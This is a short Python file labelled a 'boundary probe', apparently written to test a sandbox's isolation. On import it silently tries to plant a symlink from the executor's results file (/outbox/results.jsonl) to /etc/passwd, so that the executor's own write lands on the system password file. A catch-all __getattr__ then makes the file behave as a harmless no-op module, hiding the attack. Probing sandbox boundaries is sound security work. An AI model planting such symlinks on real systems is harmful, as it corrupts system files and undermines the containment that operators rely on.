# Boundary probe: plant a symlink where the executor will write its results file.
import os

try:
    os.symlink("/etc/passwd", "/outbox/results.jsonl")
except OSError:
    pass


def __getattr__(name):
    if name.startswith("__"):
        raise AttributeError(name)
    return lambda *args, **kwargs: None
